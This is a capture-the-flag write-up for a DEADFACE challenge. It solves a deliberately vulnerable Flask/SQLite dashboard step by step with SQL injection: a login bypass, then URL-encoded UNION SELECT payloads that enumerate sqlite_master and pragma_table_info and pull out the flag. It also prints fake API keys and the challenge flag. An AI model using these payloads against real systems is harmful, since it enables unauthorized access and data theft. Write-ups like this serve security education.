@@ -1,0 +1,188 @@
+DEADFACE is taunting us! We found their link! There was a breach!. How deep, and how for heaven’s sakes did they got in, we don’t know! Can you locate the flag?
+
+Submit the flag as deadface{text}.
+
+https://deadface-db01.chals.io
+
+---
+
+1. We get a login page, but can't get past as we don't have creds.
+
+2. Tried simple payload `admin' OR '1'='1` and got through.
+
+3. We get a search dashboard, but searching for anything yields error - `near "%": syntax error`
+```
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.3 Python/3.11.14
+Date: Sun, 26 Oct 2025 10:12:03 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1877
+Vary: Cookie
+Connection: close
+
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<title>Absolutly not a fake Admin Dashboard</title>
+		<style>
+			body {
+				font-family: Arial, sans-serif;
+				background: #f5f6fa;
+				margin: 0;
+				padding: 0;
+			}
+			.container {
+				width: 100%;
+				max-width: 600px;
+				margin: 40px auto;
+				background: #fff;
+				padding: 20px;
+				border-radius: 12px;
+				box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+			}
+			h2 {
+				text-align: center;
+				margin-bottom: 20px;
+			}
+			input[type="text"],
+			select {
+				width: 100%;
+				padding: 12px;
+				margin: 8px 0;
+				border: 1px solid #ddd;
+				border-radius: 8px;
+				box-sizing: border-box;
+			}
+			button {
+				width: 100%;
+				padding: 12px;
+				background: #3498db;
+				color: #fff;
+				border: none;
+				border-radius: 8px;
+				cursor: pointer;
+				font-weight: bold;
+			}
+			button:hover {
+				background: #2980b9;
+			}
+			.card {
+				background: #f9f9f9;
+				padding: 15px;
+				margin-bottom: 12px;
+				border-radius: 8px;
+			}
+			.results {
+				margin-top: 20px;
+				padding: 10px;
+				background: #f9f9f9;
+				border-radius: 8px;
+			}
+		</style>
+	</head>
+	<body>
+		<div class="container">
+			<div class="card">
+				<h2>Admin Dashboard</h2>
+				<form method="POST" action="/dashboard">
+					<label for="search">Search Users</label><br>
+					<input type="text" id="search" name="search" placeholder="Enter username" required />
+					<label for="database">Database</label><br>
+                    <select id="database" name="database">
+						<option value="activity_logs">Activity Logs</option>
+						<option value="api_keys">API Keys</option>
+						<option value="profiles">Profiles</option>
+					</select>
+					<button type="submit">Search</button>
+				</form>
+				<div class="results">
+					<h3>Results:</h3>
+					<div>near "%": syntax error</div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
+```
+
+4. So, just injecting `"` as input and we get an error - `unrecognized token: "''' LIKE %T%"`
+
+5. Tried a few payloads and `admin' OR 1=1 --` worked - 
+
+Activity Logs -
+
+```
+1, u001, login, 2025-09-18 12:00:10, Successful password auth from 192.0.2.10
+2, u002, failed_login, 2025-09-17 08:21:03, Invalid password attempt, user_agent=ci-bot/1.0
+3, u003, password_reset, 2025-05-02 15:33:00, Password reset requested via email
+4, guest, view_page, 2025-09-19 06:05:22, Visited /landing
+5, svc_db, job_run, 2025-09-10 00:02:11, Nightly DB job completed, rows_processed=10234
+6, qa01, test_run, 2025-08-01 09:10:00, Integration test suite executed, failures=0
+7, root, schema_migration, 2024-12-31 23:50:00, Applied migration v20241231_01
+8, u101, bulk_import, 2023-03-10 07:46:11, Imported 1000 fake users from CSV
+9, u002, api_call, 2024-09-02 11:02:45, Called /api/v1/report?start=2024-08-01
+10, u001, logout, 2025-09-18 17:59:59, User logged out manually
+```
+API keys - 
+
+```
+key-0001, u001, ak_test_0123456789abcdef, read,write, 2024-09-01 10:00:00, 0
+key-0002, u002, ak_test_fedcba9876543210, read, 2024-09-02 11:00:00, 0
+key-0003, svc_db, ak_srv_db_aaaaaaaa1111, db:read,db:write, 2024-06-30 12:05:00, 0
+key-0004, qa01, ak_qa_9999bbbb0000, test:run, 2025-02-14 09:09:09, 0
+key-revoked-1, u003, ak_revoked_1234deadbeef, read, 2023-12-01 00:00:00, 1
+key-admin-alpha, root, ak_root_admin_zz99yy88, admin, 2021-01-01 01:01:01, 0
+key-guest-temp, guest, ak_guest_temp_0000, read, 2025-09-19 05:55:00, 0
+```
+Profiles - 
+```
+u001, user001, Alice Mercer, alice.mercer@example.test, Enthusiastic tester and coffee lover. Writes silly scripts on weekends., 2024-01-12 09:15:00
+u002, user002, Bob Carter, bob.carter@example.test, DevOps tinkerer. Collector of weird logs., 2024-02-05 14:03:00
+u003, user003, Charlie Vega, charlie.vega@example.test, Likes long walks through console output., 2024-03-21 20:30:00
+u004, alice, Alice Liddell, alice.liddell@example.test, Faux admin account for integration tests., 2023-11-11 11:11:11
+u005, bob, Robert "Bob" Stone, robert.stone@example.test, Temporary account. Do not panic., 2022-07-01 08:00:00
+u006, guest, Guest User, guest@example.test, Guest profile for demonstrations., 2025-01-01 00:00:00
+svc_db, service_db, Database Service, dbsvc@example.test, Service account used by DB jobs (fake)., 2024-06-30 12:00:00
+qa01, qa01, QA Team Member, qa01@example.test, QA automation bot., 2024-05-15 09:00:00
+u101, u101, Member 101, member101@example.test, Patterned user for load testing., 2023-03-10 07:45:00
+root, root, Root User, root@example.test, Simulated superuser (do not use in production)., 2021-12-31 23:59:59
+```
+
+-> Now, trying to get table names - 
+
+```
+search=%25%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Cgroup_concat%28name%2C%27%2C%27%29%2CNULL+FROM+sqlite_master+WHERE+type%3D%27table%27+AND+name+NOT+LIKE+%27sqlite_%25%27--&database=activity_logs
+```
+Output -
+```
+None, None, None, general,profiles,sessions,api_keys,activity_logs, None
+```
+
+-> Now let's check each of these tables,what columns they have.
+
+```
+search=%25%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Cgroup_concat%28name%2C%27%2C%27%29%2CNULL+FROM+pragma_table_info%28%27general%27%29--&database=activity_logs
+```
+
+Result - 
+
+```
+None, None, None, flag, None
+```
+
+Seems like we have flag in general itself.
+
+-> Let's query it's value - 
+
+Payload - 
+
+```
+search=%25%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Cgroup_concat%28CAST%28flag+AS+TEXT%29%2C%27%2C%27%29%2CNULL+FROM+general--&database=activity_logs
+```
+Result - 
+```
+None, None, None, DEADFACE{you_found_the_sqli_01_flag!}, None
+```
+
+Flag - DEADFACE{you_found_the_sqli_01_flag!}
